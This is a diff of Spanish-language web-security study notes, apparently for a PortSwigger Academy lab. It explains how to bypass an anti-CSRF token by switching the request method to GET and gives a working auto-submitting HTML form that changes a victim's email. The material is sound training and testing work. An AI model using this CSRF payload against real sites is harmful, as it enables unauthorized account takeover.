@@ -1979,12 +1979,28 @@ Idea ==> construir HTML que al hacer click, realice una petición a ese endpoint
 
 ### Token validation depends request method
 
-En este caso, el token `csrf` para nuestras peticiones lo podemos ver, pero no sabemos cuál será el de la víctima.
+En este caso, existe el token `anti-csrf` único y aleatorio para securizar las peticiones y no sabemos cuál será el de la víctima.
+
+![reqmethod](images/reqmethod.png) 
+
+>La idea aquí es **bypassear** la validación que se realiza del token `anti-csrf` cambiando el método de la petición a GET.
+
+Click derecho en la petición POST > *Change request method*
+
+![reqmethod2](images/reqmethod2.png)  
+
+Ahora todo va como parámetro de la URL. Probamos a mandar la variable del token vacía, **incluso quitar el propio parámetro y enviar sólo el email** y funciona ==> hemos logrado bypassear la validación del token.
+Queda construir el ataque:
 
 ```html
-<a>
+<form method="GET" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
+    <input type="hidden" name="email" value="anything@web-security-academy.net">
+</form> 
+<script> 
+     document.forms[0].submit(); 
+</script>
 ```
-  
+
 ### OAuth  
 
 >oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  
